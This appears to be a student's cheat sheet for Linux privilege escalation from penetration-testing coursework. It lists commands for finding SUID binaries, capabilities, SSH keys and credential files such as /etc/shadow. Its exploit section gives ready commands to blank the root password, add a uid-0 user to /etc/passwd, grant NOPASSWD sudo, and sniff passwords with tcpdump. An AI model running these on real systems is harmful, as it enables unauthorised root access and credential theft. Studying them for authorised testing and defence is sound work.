# Search
[[THM/Jr.Penetration Tester/Post/Linux Escalation/Enumeration#pivotal Find !|Find !]]
```bash
find / -perm -u=s -type f 2>/dev/null
find / -perm /2000 -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

find / -writable -type d 2>/dev/null
find / -perm a=x #查找可执行文件

find / -user tim 2>/dev/null
find / -group staff 2>/dev/null
# CAP
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```
## Pieces
```bash
env
history
ls -lsaht |grep -i '.secret' --color=auto #root权限后
ls -lsaht |grep -i '.conf' --color=auto
#Hidden File
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep <user>
find / -type d -name ".*" -ls 2>/dev/null
# Temp File
ls -l /tmp /var/tmp /dev/shm
```
## Sensitive Files for SSH:
```bash
find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null
```
## SUID Linux Capabilities
cap_setuid, cap_net_raw...
```bash
/usr/sbin/getcap -r / 2>/dev/null
```
### Sensitive files
```bash
locate password | more

/etc/profile
/etc/passwd
/etc/group
/etc/shadow
/etc/gshadow
/var/apache2/config.inc
/var/lib/mysql/mysql/user.MYD
/root/anaconda-ks.cfg
~/.bash_history
~/.bash_profile
~/.bash_login
 ~/.nano_history
~/.atftp_history
~/.mysql_history
~/.php_history
/var/mail/


# Log FIles
/var/log
/etc/httpd
/var/www/logs
/var/log/lighttpd
/opt
## httpd

cat /var/webmin/miniserv.log
cat /etc/httpd/logs/access_log
cat /etc/httpd/logs/access.log
cat /etc/httpd/logs/error_log
cat /etc/httpd/logs/error.log

cat /var/log/httpd/access_log
cat /var/log/httpd/access.log
cat /var/log/httpd/error_log
cat /var/log/httpd/error.log

cat /var/log/apache2/access_log
cat /var/log/apache2/access.log
cat /var/log/apache2/error_log
cat /var/log/apache2/error.log
cat /var/log/apache/access_log
cat /var/log/apache/access.log

cat /var/www/logs/access_log
cat /var/www/logs/access.log

cat /var/log/lighttpd/access.log
cat /var/log/lighttpd/error.log
cat /var/log/lighttpd/lighttpd.access.log
cat /var/log/lighttpd/lighttpd.error.log
## services
ls -alh /var/lib/dhcp3/
ls -alh /var/log/postgresql/
ls -alh /var/log/proftpd/
ls -alh /var/log/samba/

cat /var/log/auth.log
cat /var/log/chttp.log
cat /var/log/cups/error_log
cat /var/log/dpkg.log
cat /var/log/faillog

cat /var/log/lastlog
cat /var/log/messages
cat /var/log/secure
cat /var/log/syslog
cat /var/log/wtmp
cat /var/log/xferlog
cat /var/log/yum.log
cat /var/run/utmp

```

Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp
# Exploit
## Writable /etc/passwd
```bash
# 将root账户密码置空
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
cat /etc/passwd | head -n1
# root::0:0:root:/root:/bin/bash  [x]没有了！

#插入一个新的root2用户
openssl passwd w00t
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2
```
## Modify /etc/sudoers
```bash
echo "<username> ALL=(root) NOPASSWD: ALL" >> /etc/sudoers
```
## suid/cap
[GTFObins](https://gtfobins.github.io/#)
### sudoer
```bash
sudo -l              #查看是否有tcpdump的sudo权限

sudo tcpdump -i lo -A | grep "pass"
cat /var/log/syslog | grep tcpdump  #查看提权操作时，该二进制文件做了什么
```